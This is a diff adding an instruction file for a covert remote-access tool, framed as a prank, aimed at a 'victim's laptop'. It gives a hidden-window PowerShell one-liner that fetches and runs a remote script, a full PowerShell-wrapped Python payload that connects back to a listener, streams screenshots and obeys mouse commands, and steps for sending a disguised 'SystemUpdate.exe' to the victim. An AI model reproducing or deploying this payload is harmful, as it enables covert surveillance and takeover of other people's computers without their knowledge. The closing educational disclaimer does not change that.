@@ -1,0 +1,43 @@
+===============================================================
+POWERSHELL ONE-LINER (Copy and paste on victim's laptop)
+===============================================================
+
+METHOD 1: Direct execution (if Python installed on victim)
+-----------------------------------------------------------
+powershell -w hidden -c "iex(iwr -Uri 'http://172.28.1.78:8000/QUICK_PRANK.ps1' -UseBasicParsing)"
+
+
+METHOD 2: Copy-paste this ENTIRE command in PowerShell:
+-----------------------------------------------------------
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$c=@'`nimport socket,pickle,pyautogui,cv2,numpy as np,time,sys,threading;exec(\"\"\"try:import ctypes;ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)`nexcept:pass`npyautogui.PAUSE=0;pyautogui.FAILSAFE=False;s=socket.socket();s.settimeout(10)`ntry:s.connect(('172.28.1.78',5555))`nexcept:sys.exit()`ns.settimeout(0.1);running=[True];sw,sh=pyautogui.size()`ndef cmd():`n while running[0]:`n  try:`n   d=s.recv(20)`n   if d and d.startswith(b'CMD:'):`n    sz=int(d.decode().split(':')[1].strip());data=b''`n    while len(data)<sz:`n     p=s.recv(min(4096,sz-len(data)))`n     if not p:break`n     data+=p`n    if len(data)==sz:`n     c=pickle.loads(data);t=c.get('type');d=c.get('data')`n     if t=='MOUSE_MOVE':pyautogui.moveTo(int(d['norm_x']*sw),int(d['norm_y']*sh),duration=0,_pause=False)`n     elif t=='MOUSE_DOWN':pyautogui.moveTo(int(d['norm_x']*sw),int(d['norm_y']*sh),duration=0,_pause=False);pyautogui.mouseDown(button=d['button'],_pause=False)`n     elif t=='MOUSE_UP':pyautogui.moveTo(int(d['norm_x']*sw),int(d['norm_y']*sh),duration=0,_pause=False);pyautogui.mouseUp(button=d['button'],_pause=False)`n     elif t=='MOUSE_CLICK':pyautogui.click(int(d['norm_x']*sw),int(d['norm_y']*sh),button=d['button'],_pause=False)`n  except:pass`nthreading.Thread(target=cmd,daemon=True).start()`nwhile running[0]:`n try:`n  ss=pyautogui.screenshot();f=np.array(ss);f=cv2.cvtColor(f,cv2.COLOR_RGB2BGR);_,buf=cv2.imencode('.jpg',f,[int(cv2.IMWRITE_JPEG_QUALITY),80]);data=pickle.dumps(buf);sz=len(data);s.sendall(f'{sz:<16}'.encode());s.sendall(data);time.sleep(0.1)`n except:break`ns.close()\"\"\")"`n'@;$c|python -"
+
+
+METHOD 3: Build standalone EXE (EASIEST!)
+-----------------------------------------------------------
+1. On your laptop, run: BUILD_CLIENT.bat
+2. Send victim: dist\SystemUpdate.exe
+3. Victim double-clicks = INSTANT connection!
+
+
+===============================================================
+SETUP INSTRUCTIONS:
+===============================================================
+
+ON YOUR LAPTOP (Server):
+1. Right-click SETUP_FIREWALL.bat → Run as Admin
+2. Double-click START_SERVER.bat
+3. Wait for GUI to appear
+
+ON VICTIM'S LAPTOP:
+Method 1: Send SystemUpdate.exe → They double-click
+Method 2: Copy one-liner → Paste in PowerShell → Enter
+
+===============================================================
+IMPORTANT NOTES:
+===============================================================
+- Both laptops MUST be on same network (WiFi)
+- Antivirus might flag the EXE (expected for remote tools)
+- Only use on devices you have permission to test!
+- This is for educational purposes only!
+
+===============================================================
